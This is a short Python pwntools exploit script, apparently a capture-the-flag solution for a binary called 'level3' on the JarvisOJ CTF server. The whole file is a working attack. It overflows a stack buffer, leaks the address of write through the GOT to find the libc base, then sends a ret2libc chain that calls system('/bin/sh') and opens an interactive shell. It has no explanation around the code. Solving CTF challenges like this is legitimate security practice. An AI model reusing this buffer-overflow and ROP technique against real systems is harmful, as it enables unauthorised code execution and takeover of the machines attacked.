#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./level3"
context.log_level = "debug"
elf = context.binary

if sys.argv[1] == 'l':
    io = process("./level3")
    libc = elf.libc

else:
    io = remote("pwn2.jarvisoj.com")
    libc = ELF("./libc-2.19.so")

if __name__ == "__main__":
    leak = flat(cyclic(0x88 + 4), elf.plt['write'], elf.sym['_start'], 1, elf.got['write'], 4)
    io.sendlineafter("Input:\n", leak)
    libc.address = u32(io.recvuntil("\xf7")[-4: ]) - libc.sym['write']
    success("libc -> {:#x}".format(libc.address))
    pause()

    rop = flat(cyclic(0x88 + 4), libc.sym['system'], 'aaaa', next(libc.search("/bin/sh")))
    io.sendlineafter("Input:\n", rop)

    io.interactive()
